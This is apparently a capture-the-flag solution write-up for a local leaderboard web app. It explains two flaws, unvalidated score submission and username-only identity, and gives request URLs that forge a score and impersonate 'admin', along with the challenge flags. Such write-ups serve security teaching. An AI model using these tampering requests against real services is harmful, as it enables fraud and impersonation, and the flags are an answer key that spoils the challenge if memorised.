## Solution 1
- The leaderboard does not validation on the score being passed in. Since these are user submitted, this is a problem. 
- Arbitrary scores can be submitted to the leaderboard. 
- ``http://localhost:5000/submit_score?new_score=100000&username=AA`` 
- Flag: SC4{ValidateYourInputKids!}

## Solution 2
- The user identifier is simply a username. There's no large, random value or anything else.  
- Make a request with the 'admin' to add a score to get the flag. 
- ``http://localhost:5000/submit_score?new_score=1&username=admin`` 
- Flag: SC4{Wh0SaidY0UC-uld_Play?1}
